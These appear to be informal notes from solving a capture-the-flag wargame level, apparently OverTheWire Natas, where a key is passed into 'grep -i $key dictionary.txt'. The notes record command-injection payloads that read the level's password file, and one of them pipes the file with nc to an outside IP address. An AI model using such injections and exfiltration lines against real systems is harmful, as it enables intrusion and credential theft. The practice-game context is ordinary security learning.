there is the command 
"grep -i $key dictionary.txt"
in the file, I want an injection script

grep -i; cat /etc/natas_webpass/natas10 | nc 68.5.218.56 5554; 
grep -i; cat /etc/natas_webpass/natas10; THis worked, bingo

since there is crap after the position the injection will go to, we will add an NC command to send the result to a server
